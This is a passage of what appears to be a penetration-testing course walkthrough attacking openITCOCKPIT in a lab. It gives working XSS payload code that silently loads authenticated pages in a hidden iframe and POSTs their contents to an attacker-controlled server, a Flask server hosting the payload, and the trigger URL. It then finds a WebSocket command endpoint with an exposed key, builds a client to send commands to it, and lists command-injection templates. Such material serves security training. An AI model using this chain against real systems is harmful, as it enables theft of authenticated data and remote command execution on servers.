With the certificate and key generated, we will load them into the API application and specify the host and port to run on.

app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
Listing 28 - Starting the Flask app

We'll enter the code in Listing 28 below the configuration of the app and database variables. This line will always be the last line of this script.

Now that the Flask server is set to run, we need to create some endpoints. The first endpoint will respond with the contents of client.js (the XSS payload) to allow the XSS to load our payload.

We'll use a Python decorator3 to set the route. Specifically, we'll set the name of the route and the method that will be allowed (GET). We will send the client.js file with Flask's send_file function.

The code for this is shown in Listing 29 and will be entered after the configuration of the app and database variables but before app.run is called:

@app.route('/client.js', methods=['GET'])
def clientjs():
    print("[+] Sending Payload")
    return send_file('./client.js', attachment_filename='client.js')
Listing 29 - Responding with client.js

Running the API with sudo python3 api.py should start the listener on port 443.

kali@kali:~/scripts$ sudo python3 api.py
 * Serving Flask app "api" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on https://0.0.0.0:443/ (Press CTRL+C to quit)
[+] Sending Payload
Listing 30 - Starting the API Server

Opening a browser to https://<Your Kali IP>/client.js and accepting the self-signed certificate should display the client.js file that we've created earlier. This URL will become the source of the payload for the XSS.

1
(Cory Dolphin, 2013), https://flask-cors.readthedocs.io/en/latest/ ↩︎

2
(Mozilla, 2020), <https://developer.mozilla.org/en-US/docs/Web/<http/CORS> ↩︎

3
(Hackers And Slackers, 2020), https://hackersandslackers.com/flask-routes/#defining-routes ↩︎

##### Scraping Content
Now that we have a web server to send our data to and a database to store the data, we need to finish the client.js script that targets the authenticated victim and will scrape the data they have access to. In addition to replacing the DOM with the fake login page that was created earlier, there will be four additional steps. Our script will:

Load the home page.
Search for all unique links and save their hrefs.
Fetch the content of each link.
Send the content obtained from each link to our API server.
At this point, we do not know the URL of the homepage for an authenticated user. However, since visiting the root of the application as an unauthenticated user redirects to a login page, we can assume the root of the application will redirect to an authenticated page if a session exists. While we will use XHR requests to fetch the content of each link we find, we don't want to use an XHR request on the home page since we don't know if the JavaScript sources running on the home page add additional links to the DOM after the page is loaded. Instead, we will use an iframe since it will load the page, follow any redirects, and render any JavaScript. Once the page is fully loaded, we can grab all the links that the authenticated user has access to.

In addition to loading the home page, there are a few additional important items to consider regarding loading the links we discover. First, we don't want to follow a link that will log out the current session. So we will avoid any links that contain the words "logout", "log-out", "signout", or "sign-out". Second, we don't want to scrape all links as soon as we open the iframe. We have already seen that openITCOCKPIT loads a lot of JavaScript. This JavaScript could load additional content after the HTML is rendered. To avoid this, we will wait a few seconds after the page is "loaded" to ensure that everything is added to the DOM.

We will add JavaScript beneath the existing client.js code that will create a full-page iframe element, set an onload action, and set the source of the page to the root of openITCOCKPIT. The JavaScript code for this is shown in Listing 31.

var iframe = document.createElement('iframe');
iframe.setAttribute("style","display:none")
iframe.onload = actions;
iframe.width = "100%"
iframe.height = "100%"
iframe.src = "https://openitcockpit"

body = document.getElementsByTagName('body')[0];
body.appendChild(iframe)
Listing 31 - Creating a homepage iframe

We don't want the victim to see the page loading, so we will set the style attribute to "display:none". Even though the iframe is not shown, the browser will still load the page.

The third line in Listing 31 references an actions function that does not currently exist. The actions function is the callback that defines the actions we want to perform when the page is loaded. As described earlier, we will wait five seconds to ensure that all content is fully loaded and added to the DOM. This might not be necessary, but in a black box scenario, it's better to exercise caution. After the delay, we will call the function that will grab the content we are looking for.

function actions(){
    setTimeout(function(){ getContent() }, 5000);
}
Listing 32 - Actions function

We are separating a lot of the actions into separate functions. This is not absolutely necessary but this will make the code more manageable when we add more functionality, especially in the Extra Mile exercise.

The actions function waits five seconds and calls getContent():

function getContent(){
}
Listing 33 - getContent definition

In getContent(), we will grab all the a elements from the iframe, extract all href tags from the a elements, remove all duplicate links, and check the validity of the href URL. When we grab all a elements the getElementsByTagName function will return a HTMLCollection. For further processing, we must convert the HTMLCollection to an Array:

allA = iframe.contentDocument.getElementsByTagName("a")

allHrefs = []
for (var i=0; i<allA.length; i++){
    allHrefs.push(allA[i].href)
}
Listing 34 - Grabbing all a elements

Next, we need to make sure that the array only contains unique values to reduce the traffic we are sending. The library we are currently exploiting for XSS, lodash, has a "unique" function that can handle this. To access this library, we will use the underscore (_) character.1 We'll pass the allHrefs array into the unique function and save the output into uniqueHrefs.

uniqueHrefs = _.unique(allHrefs)
Listing 35 - Obtaining only unique hrefs

Now that we have a list of all unique hrefs, we need to check if the href is a valid URL and remove any links that might log out the current user. In Listing 36, we first create a new array where we can store only the valid URLs. Next, we loop through the uniqueHrefs, run the href through a function(validURL) to check if the URL is valid and verify that it will not log out the target. The validURL function is not currently implemented and will be left as an exercise.

validUniqueHrefs = []
for(var i=0; i<uniqueHrefs.length; i++) {
    if (validURL(uniqueHrefs[i])){
        validUniqueHrefs.push(uniqueHrefs[i]);
    }
}
Listing 36 - Checking for valid URL

Next, we will send a GET request to each valid and unique href, encode the content, and send the content over to our API server. We will use the fetch method to make these requests.

The code block in Listing 37 will loop through each valid, unique href and GET the content. Since we don't want a user's browser to completely freeze during this operation, we'll run the request as an asynchronous task. The reason for using the fetch method is that will return a JavaScript promise.2 A promise handles asynchronous operations once they complete or fail. Instead of blocking the entire thread as the code executes, a function passed in to the promise will be executed once the operation is complete. This also allows us to tie multiple promises together to ensure one method only executes after another completes.

The promise returned by the fetch will be handled by .then and the response will be passed in as an argument to the function. The text from the response is obtained (which returns another promise) and passed into another .then function. Within the final .then function, the text is sent to our API server along with the source URL:

validUniqueHrefs.forEach(href =>{
    fetch(href, {
        "credentials": "include",
        "method": "GET",
    })
    .then((response) => {
      return response.text()
    })
    .then(function (text){
      fetch("https://192.168.119.120/content", {
        body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        method: "POST"
      })
    });
})
Listing 37 - Obtaining authenticated content

To recap, our JavaScript should now load the homepage (if the user is logged in) and scrape all links. The obtained links are then checked for validity and any logout links are removed. Finally, each link is visited in the background of the user's browser and the contents are forwarded to our API server for storage.

1
(Lodash, 2015), https://github.com/lodash/lodash/blob/1.3.1/doc/README.md#_uniqarray--issortedfalse-callbackidentity-thisarg ↩︎

2
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise ↩︎

Accessed this url to trigger stat collection:
url was hosted on kali flask server api.py

```
https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.45.204/client.js
```
##### Dumping the Contents
At this point, we should have a database full of content from an authenticated user. The next step is to dump this data into files that are easier to manage. We'll create a Python script that imports and expands on our db.py script.

We'll start off by importing all the necessary libraries and modules. In this case, we need os to be able to write the file and we need create_connection, get_content, and get_locations from db.py to get the content. We will also need a variable for the database name we will be using and the directory that we want to place the files into. The contents of Listing 38 will be saved to dump.py:

import os
from db import create_connection, get_content, get_locations

database = r"sqlite.db"
contentDir = os.getcwd() + "/content"
Listing 38 - Required imports for dump.py

Next, we can begin creating the main section of the script. First, we will need to make a database connection and query all locations. For each location, we will query for the content and write the content to the appropriate file. The code for this section is shown in Listing 39.

if __name__ == '__main__':
    conn = create_connection(database)
    locations = get_locations(conn)
    for l in locations:
        content = get_content(conn, l)
        write_to_file(l[0], content)
Listing 39 - Main section of dump.py

Next, we'll complete the write_to_file function, which stores the contents of each location into an html file. If a location contains a subdirectory, it must be stored in a folder with the same name as the subdirectory. Conveniently, the structure of a URL also fits a URL path and not much modification needs to occur. The write_to_file function is shown in Listing 40.

def write_to_file(url, content):
    fileName = url.replace('https://','')
    if not fileName.endswith(".html"):
        fileName = fileName + ".html"
    fullname = os.path.join(contentDir, fileName)
    path, basename = os.path.split(fullname)
    if not os.path.exists(path):
        os.makedirs(path)
    with open(fullname, 'w') as f:
        f.write(content)
Listing 40 - write_to_file Function

The write_to_file function can be placed below the creation of the contentDir variable but above the if statement that checks if the __name__ variable is set to __main__.


##### Discovery
The discovery process is not automated and can be time-consuming. However, we can look for keywords that trigger our hacker-senses in order to speed up this process. For example, the commands.html, cronjobs.html, and serviceescalations.html files we obtained from the victim immediately catch our attention as the names of the files suggest that they may permit system access.

Interestingly, content/openitcockpit/commands.html contains an object named appData, which contains some interesting variables:

var appData = {"jsonData":{"isAjax":false,"isMobile":false,"websocket_url":"wss:\/\/openitcockpit\/sudo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"},"webroot":"https:\/\/openitcockpit\/","url":"","controller":"Commands","action":"index","params":{"named":[],"pass":[],"plugin":"","controller":"commands","action":"index"},"Types":{"CODE_SUCCESS":"success","CODE_ERROR":"error","CODE_EXCEPTION":"exception","CODE_MISSING_PARAMETERS":"missing_parameters","CODE_NOT_AUTHENTICATED":"not_authenticated","CODE_AUTHENTICATION_FAILED":"authentication_failed","CODE_VALIDATION_FAILED":"validation_failed","CODE_NOT_ALLOWED":"not_allowed","CODE_NOT_AVAILABLE":"not_available","CODE_INVALID_TRIGGER_ACTION_ID":"invalid_trigger_action_id","ROLE_ADMIN":"admin","ROLE_EMPLOYEE":"employee"}};
Listing 41 - Commands.html setting appData

There are two portions of particular interest. First a "websocket_url" is defined, which ends with "sudo_server". Next, a key named "akey" is defined with a value of "1fea123e07f730f76e661bced33a94152378611e". The combination of a commands route and sudo_server WebSocket connection endpoint piques our interest.

WebSocket1 is a browser-supported communication protocol that uses HTTP for the initial connection but then creates a full-duplex connection, allowing for fast communication between the client and server. While HTTP is a stateless protocol, WebSocket is stateful. In a properly-built solution, the initial HTTP connection would authenticate the user and each subsequent WebSocket request would not require authentication. However, due to complexities many developers face when programming with the WebSocket protocol, they often "roll their own" authentication. In openITCOCKPIT, we see a key is provided in the same object a websocket_url is set. We suspect this might be used for authentication.

WebSocket communication is often overlooked during pentests. Up until recently, Burp Repeater did not support WebSocket messages and Burp Intruder still does not. However, WebSocket communication can have just as much control over a server as HTTP can. Finding a WebSocket endpoint (and in this case a key), can significantly increase the risk profile of an application.

In a browser-based application, WebSocket connections are initiated via JavaScript. Since JavaScript is not compiled, the source defining the WebSocket connection must be located in one of the JavaScript files loaded on this page. We can use these files to learn how to communicate with the WebSocket server and create our own client.

The commands.html page loads many JavaScript files, but most are plugins and libraries. However, a cluster of JavaScript files just before the end of the head tag do not seem to load plugins or libraries:

<script src="/vendor/angular/angular.min.js"></script><script src="/js/vendor/vis-4.21.0/dist/vis.js"></script><script src="/js/scripts/ng.app.js"></script><script src="/vendor/javascript-detect-element-resize/jquery.resize.js"></script><script src="/vendor/angular-gridster/dist/angular-gridster.min.js"></script><script src="/js/lib/angular-nestable.js"></script><script src="/js/compressed_angular_services.js"></script><script src="/js/compressed_angular_directives.js"></script><script src="/js/compressed_angular_controllers.js"></script>
Listing 42 - Potentially custom JavaScript

As evidenced by the listing, custom JavaScript is stored in the js folder and not in vendor, plugin, or lib. We'll grep for all script tags that also have a src set, removing any entries that are in the vendor, plugin, or lib folders:

kali@kali:~/scripts/content/openitcockpit$ cat commands.html | grep -E "script.*src" | grep -Ev "vendor|lib|plugin"
<script type="text/javascript" src="/js/app/app_controller.js?v3.7.2"></script>
<script type="text/javascript" src="/js/compressed_components.js?v3.7.2"></script>
<script type="text/javascript" src="/js/compressed_controllers.js?v3.7.2"></script>
</script><script type="text/javascript" src="/frontend/js/bootstrap.js?v3.7.2"></script>
        <script type="text/javascript" src="/js/app/bootstrap.js?v3.7.2"></script>
        <script type="text/javascript" src="/js/app/layoutfix.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/notification/SmartNotification.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/demo.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/app.js?v3.7.2"></script>
        <script type="text/javascript" src="/smartadmin/js/smartwidgets/jarvis.widget.js?v3.7.2"></script>
Listing 43 - Finding custom JavaScript files

This leaves us with a more manageable list, but there are some false positives that we can remove. The smartadmin folder is an openITCOCKPIT theme (clarified with a Google search), so we can remove that. We'll save the final list of custom JavaScript files to ~/scripts/content/custom_js/list.txt, shown in Listing 44.

kali@kali:~/scripts/content/custom_js$ cat list.txt 
https://openitcockpit/js/app/app_controller.js
https://openitcockpit/js/compressed_components.js
https://openitcockpit/js/compressed_controllers.js
https://openitcockpit/frontend/js/bootstrap.js
https://openitcockpit/js/app/bootstrap.js
https://openitcockpit/js/app/layoutfix.js
https://openitcockpit/js/compressed_angular_services.js
https://openitcockpit/js/compressed_angular_directives.js
https://openitcockpit/js/compressed_angular_controllers.js
Listing 44 - List of custom JavaScript

It's very rare for client-side JavaScript files to be protected behind authentication. For this reason we should be able to retrieve the files without authentication. We'll use wget to download the list of custom JavaScript into the custom_js folder:

kali@kali:~/scripts/content/custom_js$ wget --no-check-certificate -q -i list.txt

kali@kali:~/scripts/content/custom_js$ ls
app_controller.js  compressed_angular_controllers.js  compressed_components.js   list
bootstrap.js       compressed_angular_directives.js   compressed_controllers.js
bootstrap.js.1     compressed_angular_services.js     layoutfix.js
Listing 45 - Downloading custom JavaScript

There are multiple files named bootstrap.js, but the content is minimal and can be ignored. The "compressed*" files contain hard-to-read, compressed, JavaScript code. We'll use the js-beautify2 Python script to "pretty-print" the files into uncompressed variants:

kali@kali:~/scripts/content/custom_js$ sudo pip3 install jsbeautifier
...
Successfully built jsbeautifier editorconfig
Installing collected packages: editorconfig, jsbeautifier
Successfully installed editorconfig-0.12.2 jsbeautifier-1.10.3

kali@kali:~/scripts/content/custom_js$ mkdir pretty

kali@kali:~/scripts/content/custom_js$ for f in compressed_*.js; do js-beautify $f > pretty/"${f//compressed_}"; done;
Listing 46 - Using js-beautify to make JavaScript readable

Now that we have a readable version of the custom JavaScript, we can begin reviewing the files. Our goal is to determine how the WebSocket server works in order to be able to interact with it. From this point forward, we will analyze the uncompressed files.

1
(Wikipedia, 2020), https://en.wikipedia.org/wiki/WebSocket ↩︎

2
(beautify-web, 2020), https://github.com/beautify-web/js-beautify ↩︎

##### Reading and Understanding the JavaScript
WebSocket communicaton can be initiated with JavaScript by running new WebSocket.1 As we search through the files, we'll use this information to discover clues about the configuration of the "sudo_server" WebSocket.

A manual review of the files leads us to components.js. Lines 1248 to 1331 define the component named WebsocketSudoComponent and the functions used to send messages, parse responses, and manage the data coming in and going out to the WebSocket server:

1248  App.Components.WebsocketSudoComponent = Frontend.Component.extend({
...
1273      send: function(json, connection) {
1274          connection = connection || this._connection;
1275          connection.send(json)
1276      },
...
1331  });
Listing 47 - Definition of the SudoService

WebsocketSudoComponent also defines the function for sending messages to the WebSocket server. In order to discover the messages that are available to be sent to the server, we can search for any calls to the .send() function. To do this, we'll grep for "send(" in the uncompressed files.

kali@kali:~/scripts/content/custom_js$ grep -r  "send(" ./ --exclude="compressed*"
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _connection.send(json)
./pretty/angular_services.js: _send(json)
./pretty/angular_services.js: _send(JSON.stringify({
./pretty/angular_services.js: _connection.send(json)
./pretty/angular_services.js: _send(json)
./pretty/components.js:  connection.send(json)
./pretty/components.js:  this.send(this.toJson('requestUniqId', ''))
./pretty/components.js:  this.send(this.toJson('keepAlive', ''))
./pretty/components.js:  this._connection.send(jsonArr);
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('5238f8e57e72e81d44119a8ffc3f98ea', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_uninstall', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_install', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('d41d8cd98f00b204e9800998ecf8427e', {
./pretty/controllers.js: self.WebsocketSudo.send(self.WebsocketSudo.toJson('apt_get_update', ''))
./pretty/controllers.js: this.WebsocketSudo.send(this.WebsocketSudo.toJson('nagiostats', []))
...
./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 1]))
./pretty/angular_directives.js:  SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', [object.Host.uuid, 0]))
...
Listing 48 - Rough list of commands

The output reveals a list of useful commands. Removing the false positives, cleaning up the code, and removing duplicate values provides us with the manageable list of commands shown in Listing 49.

./pretty/components.js:         requestUniqId
./pretty/components.js:         keepAlive
./pretty/controllers.js:        5238f8e57e72e81d44119a8ffc3f98ea
./pretty/controllers.js:        package_uninstall
./pretty/controllers.js:        package_install
./pretty/controllers.js:        d41d8cd98f00b204e9800998ecf8427e
./pretty/controllers.js:        apt_get_update
./pretty/controllers.js:        nagiostats
./pretty/controllers.js:        execute_nagios_command
./pretty/angular_directives.js: sendCustomHostNotification
./pretty/angular_directives.js: submitHoststateAck
./pretty/angular_directives.js: submitEnableServiceNotifications
./pretty/angular_directives.js: commitPassiveResult
./pretty/angular_directives.js: sendCustomServiceNotification
./pretty/angular_directives.js: submitDisableServiceNotifications
./pretty/angular_directives.js: submitDisableHostNotifications
./pretty/angular_directives.js: enableOrDisableServiceFlapdetection
./pretty/angular_directives.js: rescheduleService
./pretty/angular_directives.js: submitServiceDowntime
./pretty/angular_directives.js: submitHostDowntime
./pretty/angular_directives.js: commitPassiveServiceResult
./pretty/angular_directives.js: submitEnableHostNotifications
./pretty/angular_directives.js: submitServicestateAck
./pretty/angular_directives.js: rescheduleHost
./pretty/angular_directives.js: enableOrDisableHostFlapdetection
Listing 49 - A selection of available commands

Although many of these seem interesting, the commands specifically listed in controllers.js seem to run system-level commands, so this is where we will focus our attention.

The execute_nagios_command command seems to indicate that it triggers some form of command execution. Opening the controllers.js file and searching for "execute_nagios_command" leads us to the content found in Listing 50. A closer inspection of this code confirms that this function may result in RCE:

loadConsole: function() {
    this.$jqconsole = $('#console').jqconsole('', 'nagios$ ');
    this.$jqconsole.Write(this.getVar('console_welcome'));
    var startPrompt = function() {
        var self = this;
        self.$jqconsole.Prompt(!0, function(input) {
            self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
            startPrompt()
        })
    }.bind(this);
    startPrompt()
},
Listing 50 - LoadConsole function

This command is used in the loadConsole function where there are also references to jqconsole. An input to the prompt is passed directly with "execute_nagios_command". A quick search for jqconsole reveals that it is a jQuery terminal plugin.2 Interesting.

Decoding the Communication
Now that we have a theory on how we can run code, let's try to understand the communication steps. We will work backwards by looking at what is sent to the send function. We will begin our review at the line in controller.js where execute_nagios_command is sent to the send function:

4691 self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input));
Listing 51 - Argument to execute_nagios_command

Line 4691 of controller.js sends execute_nagios_command along with an input to a function called toJson. Let's inspect what the toJson function does. First, we will discover where the function is defined. To do this, we can use grep to search for all instances of toJson, which will return many instances. To filter these out, we will use grep with the -v flag and look for the .send keyword.

kali@kali:~/scripts/content/custom_js$ grep -r  "toJson" ./ --exclude="compressed*" | grep -v ".send"
./components.js:    toJson: function(task, data) {
./angular_services.js:        toJson: function(task, data) {
./angular_services.js:        toJson: function(task, data) {

Listing 52 - Searching for toJson

The search for toJson revealed that the function is set in angular_services.js and components.js. The components.js file is the file where we initially found the WebsocketSudoComponent component. Since we've already found useful information in components.js, we will open the file and search for the toJson reference. The definition of toJson can be found in Listing 53

1310  toJson: function(task, data) {
1311      var jsonArr = [];
1312      jsonArr = JSON.stringify({
1313          task: task,
1314          data: data,
1315          uniqid: this._uniqid,
1316          key: this._key
1317      });
1318      return jsonArr
1319  },
Listing 53 - Reviewing toJson

The toJson function takes two arguments: the task (in this case execute_nagios_command) and some form of data (in this case input). The function then creates a JSON string of an object that contains the task, the data, a unique id, and a key. We know where task and data come from, but we must determine the source of uniqid and key. Further investigation reveals that the uniqid is defined above the toJson function in a function named _onResponse:

1283  _onResponse: function(e) {
1284      var transmitted = JSON.parse(e.data);
1285      switch (transmitted.type) {
1286          case 'connection':
1287              this._uniqid = transmitted.uniqid;
1288              this.__success(e);
1289              break;
1290          case 'response':
1291              if (this._uniqid === transmitted.uniqid) {
1292                  this._callback(transmitted)
1293              }
1294              break;
1295          case 'dispatcher':
1296              this._dispatcher(transmitted);
1297              break;
1298          case 'event':
1299              if (this._uniqid === transmitted.uniqid) {
1300                  this._event(transmitted)
1301              }
1302              break;
1303          case 'keepAlive':
1304              break
1305      }
1306  }
Listing 54 - Discovering how _uniqid is set

Based on the name, the _onResponse function is executed when a message comes in. The uniqid is set to the value provided by the server. We should expect at some point during the connection for the server to send us a uniqid value. There also seem to be five types of responses that the server will send: connection, response, dispatcher, event, and keepAlive. We will save this information for later.

Now let's determine the source of the _key value. The setup function in the same components.js file provides some clues:

1260  setup: function(wsURL, key) {
1261      this._wsUrl = wsURL;
1262      this._key = key
1263  },
Listing 55 - Discovering how _key is set

When setup is called, the WebSocket URL and the _key variable in the WebsocketSudo component are set. Let's grep for calls to this function:

kali@kali:~/scripts/content/custom_js$ grep -r  "setup(" ./ --exclude="compressed*"
...
./pretty/controllers.js:    _setupChatListFilter: function() {
./app_controller.js:        this.ImageChooser.setup(this._dom);
./app_controller.js:  this.FileChooser.setup(this._dom);
./app_controller.js:      this.WebsocketSudo.setup(this.getVar('websocket_url'), this.getVar('akey'));
Listing 56 - Searching for setup execution

Searching for "setup(" returns many function calls, but the last result is the most relevant, and the arguments that are being passed in seem familiar as they were set in commands.html. At this point, we should have everything we need to construct a execute_nagios_command task. However, we should inspect the initial connection process to the WebSocket server to make sure we are not missing anything. The connect function in the components.js file is a good place to look.

1264  connect: function() {
1265      if (this._connection === null) {
1266          this._connection = new WebSocket(this._wsUrl)
1267      }
1268      this._connection.onopen = this._onConnectionOpen.bind(this);
1269      this._connection.onmessage = this._onResponse.bind(this);
1270      this._connection.onerror = this._onError.bind(this);
1271      return this._connection
1272  },
Listing 57 - Reviewing connect function

The connect function will first create a new WebSocket connection if one doesn't exist. Next, it sets the onopen, onmessage, and onerror event handlers. The onopen event handler will call the _onConnectionOpen function. Let's take a look at _onConnectionOpen.

1277 _onConnectionOpen: function(e) {
1278     this.requestUniqId()
1279 },
...
1307 requestUniqId: function() {
1308     this.send(this.toJson('requestUniqId', ''))
1309 },
Listing 58 - Reviewing _onConnectionOpen

The _onConnectionOpen function only calls the requestUniqId function. The requestUniqId function will send a request to the server requesting a unique id. We will have to keep this in mind when attempting to interact with the WebSocket server.

1
(Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/WebSocket ↩︎

2
(Replit, 2019), https://github.com/replit-archive/jq-console ↩︎

##### Building a Client
First, we will build a script that allows us to connect and send any command as "input". This will help us learn how the server sends its responses. To do this, let's import modules we'll need and set a few global variables.

We'll use the websocket module to communicate with the server, ssl to tell the WebSocket server to ignore the bad certificate, the json module to build and parse the requests and responses, argparse to allow command line arguments, and thread to allow execution of certain tasks in the background. We know that a unique id and key is sent in every request, so we will define those as global variables:

import websocket
import ssl 
import json
import argparse
import _thread as thread

uniqid = ""
key = ""
Listing 59 - Importing modules and setting globals

Next, we will set up the arguments that we'll pass into the Python script.

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('--url', '-u',
                        required=True,
                        dest='url',
                        help='Websocket URL')
    parser.add_argument('--key', '-k',
                        required=True,
                        dest='key',
                        help='openITCOCKPIT Key')
    parser.add_argument('--verbose', '-v',
                        help='Print more data',
                        action='store_true')
    args = parser.parse_args()
Listing 60 - Setting argument parsing

We need a url and key argument to configure the connection to the WebSocket server. We will also allow for an optional verbose flag, which will assist during debugging. Next, let's set up the connection.

As shown in Listing 61, we will set the key global variable to the one passed in the argument. Next, we will configure verbose tracing if the argument is set, then we will configure the connection. We will pass in the URL and set the events to execute the functions that we want in WebSocketApp. This means that we will also need to define the four functions (on_message, on_error, on_close, and on_open). Finally, we will tell the WebSocket client to connect continuously. We will also pass in the ssl options to ignore the self-signed certificate.

    key = args.key
    websocket.enableTrace(args.verbose)
    ws = websocket.WebSocketApp(args.url,
                              on_message = on_message,
                              on_error = on_error,
                              on_close = on_close,
                              on_open = on_open)
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
Listing 61 - Configuring the connection

Now that we have our arguments set up, let's configure the four functions to handle the events. We will start with on_open.

The on_open function (shown in Listing 62) will access the WebSocket connection as an argument. Because we want the connection to stay open, but still allow the server to send us messages at any time, we will create a separate thread. The new thread will execute the run function, which is defined within the on_open function. Inside of run, we will have a loop that will run non-stop to listen for user input. The user's input will then be converted to the appropriate JSON and passed to the send function for the WebSocket connection.

def on_open(ws):
    def run():
        while True:
            cmd = input()
            ws.send(toJson("execute_nagios_command", cmd))
    thread.start_new_thread(run, ())
Listing 62 - Creating on_open

While the official client did send a request to generate a uniqid on connection, we didn't find this necessary as the server does it automatically.

Before we move on to the next function to handle events, we will build the toJson function. The toJson function (Listing 63) will mirror the official client's toJson function and will accept the task and data we want to send. We will first build a dictionary that contains the task, data, uniqid, and key. We'll then run that dictionary through a function to dump it as a JSON string.

def toJson(task,data):
    req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
    return json.dumps(req)
Listing 63 - Creating toJson

Next, we will create the event handler for on_message. As we learn how the server communicates, we will make changes to this function. The on_message event (Listing 64) passes in the WebSocket connection and the message that was sent. For now, we will parse the message, set the uniqid global variable if the server sent one, and print the raw message.

def on_message(ws, message):
    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]

    print(mes)
Listing 64 - Creating on_message

With on_message created, we will create the event handlers for on_error and on_close. For on_error, we will simply print the error. For on_close, we will just print a message that the connection was closed.

def on_error(ws, error):
    print(error)

def on_close(ws):
    print("[+] Connection Closed")
Listing 65 - Creating on_error and on_close

With the script completed, we will use it to connect to the server and attempt to send a whoami command.

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e -v
--- request header ---
GET /sudo_server HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Host: openitcockpit
Origin: http://openitcockpit
Sec-WebSocket-Key: 5E+Srv82go8K6QOoJ6WRUQ==
Sec-WebSocket-Version: 13


-----------------------
--- response header ---
HTTP/1.1 101 Switching Protocols
Server: nginx
Date: Fri, 21 Feb 2020 16:36:31 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: R4BpxrINRQ/cDOErqo4rbxfliaI=
X-Powered-By: Ratchet/0.4.1
-----------------------
{'payload': 'Connection established', 'type': 'connection', 'task': '', 'uniqid': '5e50070feeac73.88569350'}
whoami
send: b'\x81\xf5\x8b\xc1\xa3\x9e\xf0\xe3\xd7\xff\xf8\xaa\x81\xa4\xab\xe3\xc6\xe6\xee\xa2\xd6\xea\xee\x9e\xcd\xff\xec\xa8\xcc\xed\xd4\xa2\xcc\xf3\xe6\xa0\xcd\xfa\xa9\xed\x83\xbc\xef\xa0\xd7\xff\xa9\xfb\x83\xbc\xfc\xa9\xcc\xff\xe6\xa8\x81\xb2\xab\xe3\xd6\xf0\xe2\xb0\xca\xfa\xa9\xfb\x83\xbc\xa9\xed\x83\xbc\xe0\xa4\xda\xbc\xb1\xe1\x81\xaf\xed\xa4\xc2\xaf\xb9\xf2\xc6\xae\xbc\xa7\x94\xad\xbb\xa7\x94\xa8\xee\xf7\x95\xaf\xe9\xa2\xc6\xfa\xb8\xf2\xc2\xa7\xbf\xf0\x96\xac\xb8\xf6\x9b\xa8\xba\xf0\xc6\xbc\xf6'
{'payload': '\x1b[0;31mERROR: Forbidden command!\x1b[0m\n', 'type': 'response', 'task': '', 'uniqid': '', 'category': 'notification'}
{'type': 'dispatcher', 'running': False}
{'type': 'dispatcher', 'running': False}
^C
send: b'\x88\x829.J.:\xc6'
[+] Connection Closed
Listing 66 - First WebSocket connection

This initial connection produces a lot of information. First, upon initial connection, the server sends a message with a type of "connection" and a payload of "Connection established". Next, in response to the whoami command, the server response contains "Forbidden command!". Finally, the server periodically sends a dispatcher message without a payload. The connection dispatcher message types were not valuable, so we can handle those appropriately in the on_message function. We also want to clean up the output of the "response" type to only show payload of the message.

Instead of printing the full message (Listing 67), we will print the string "[+] Connected!" if the incoming message is a connection. Next, we will ignore the "dispatcher" messages and we will print only the payload of a response. Since the payload of our whoami command already contained a new line character, we will end the print with an empty string to honor the server's new line.

def on_message(ws, message):
    mes = json.loads(message)

    if "uniqid" in mes.keys():
        uniqid = mes["uniqid"]
    
    if mes["type"] == "connection":
        print("[+] Connected!")
    elif mes["type"] == "dispatcher":
        pass
    elif mes["type"] == "response":
        print(mes["payload"], end = '')
    else:
        print(mes)
Listing 67 - Updating on_message

With everything updated, we will connect and try again, this time without verbose mode:

kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 1fea123e07f730f76e661bced33a94152378611e
[+] Connected!
whoami
ERROR: Forbidden command!
^C
[+] Connection Closed
Listing 68 - Updated connection with output cleaned up

Now we have an interactive WebSocket connection where we can begin testing the input and finding allowed commands.

##### Attempting to Inject Commands
At this point, we should have discovered that ls is a valid command. Let's try to escape the command using common injection techniques.

One way to inject into a command is with operators like && and ||, which "stack" commands. The && operator will run a command if the previous command was successful and || will run a command if the previous command was unsuccessful. While there are other command injection techniques, testing each one individually is unnecessary when we can use a curated list to brute force all possible injection techniques.

For example, Fuzzdb,1 a dictionary of attacks for black box testing, contains a list of possible injections. We can download this list directly from GitHub.

kali@kali:~/scripts$ wget -q https://raw.githubusercontent.com/fuzzdb-project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt

kali@kali:~/scripts$ cat command-injection-template.txt 
{cmd}
;{cmd}
;{cmd};
^{cmd}
...
&CMD=$"{cmd}";$CMD
&&CMD=$"{cmd}";$CMD
%0DCMD=$"{cmd}";$CMD
FAIL||CMD=$"{cmd}";$CMD
<!--#exec cmd="{cmd}"-->
